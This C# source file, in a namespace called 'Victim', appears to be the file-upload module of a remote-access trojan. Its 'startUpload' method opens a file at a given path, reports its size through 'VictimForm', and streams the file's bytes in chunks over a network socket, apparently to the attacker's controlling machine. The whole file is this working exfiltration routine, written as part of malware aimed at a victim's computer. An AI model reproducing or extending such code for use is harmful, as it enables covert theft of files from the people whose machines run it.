using System;
using System.Text;
using System.IO;
using System.Net.Sockets;
namespace Victim
{
    class upload
    {
        public void startUpload(string location, Socket clientSock)
        {
            long rdby = 0;
            FileInfo txt = new FileInfo(location);
            long len2 = txt.Length;
            VictimForm.sendData(txt.Length.ToString());
            FileStream fin = new FileStream(location, FileMode.Open, FileAccess.Read);
            NetworkStream nfs = new NetworkStream(clientSock);
            lock (this)
            {
                while (rdby < txt.Length && nfs.CanWrite)
                {
                    byte[] up = new byte[2048];
                    int len = fin.Read(up, 0, up.Length);

                    nfs.Write(up, 0, len);
                    rdby = rdby + len;
                }
            }
            fin.Close();
            nfs.Close();
        }
    }
}
